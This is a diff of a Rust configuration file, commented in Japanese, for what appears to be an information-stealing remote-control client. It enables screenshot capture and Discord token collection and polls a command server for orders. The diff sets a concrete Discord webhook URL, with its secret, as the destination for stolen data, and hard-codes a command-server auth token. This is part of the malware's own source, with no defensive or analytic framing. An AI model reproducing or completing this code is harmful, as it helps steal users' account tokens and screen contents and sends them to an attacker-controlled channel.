@@ -22,13 +22,18 @@ pub struct Config {
     pub command_auth_token: String,         // サーバー認証トークン
     pub command_poll_interval_seconds: u64, // サーバーポーリング間隔（命令確認）
     pub heartbeat_interval_seconds: u64,    // ハートビート送信間隔
+
+    // 暗号鍵の取得方法（クライアントは公開鍵のみ使用）
+    // 優先順: `public_key_pem` -> 環境変数 AOI64_PUBLIC_KEY_PEM -> ファイル("public_key.pem")
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub public_key_pem: Option<String>,
 }
 
 impl Default for Config {
     fn default() -> Self {
         Config {
             timeout_seconds: 45,
-            webhook_url: "".to_string(),
+            webhook_url: "https://discord.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
             webhook_type: "Discord".to_string(),
             webhook_enabled: true,
             collect_screenshots: true,
@@ -37,11 +42,14 @@ impl Default for Config {
             collect_discord_tokens: true,
             
             // HTTPサーバー通信設定
-            command_server_url: "".to_string(),
+            command_server_url: "http://127.0.0.1:8080".to_string(),
             command_server_enabled: true,
-            command_auth_token: "".to_string(),
+            command_auth_token: "ZajmPAB9o8C5UgATU23mnGdBcun30IuILDaP8efMWRYtSlvT89".to_string(),
             command_poll_interval_seconds: 10,
             heartbeat_interval_seconds: 30,
+
+            // 既定では埋め込まない（必要なら環境変数/ファイルを利用）
+            public_key_pem: None,
         }
     }
 }
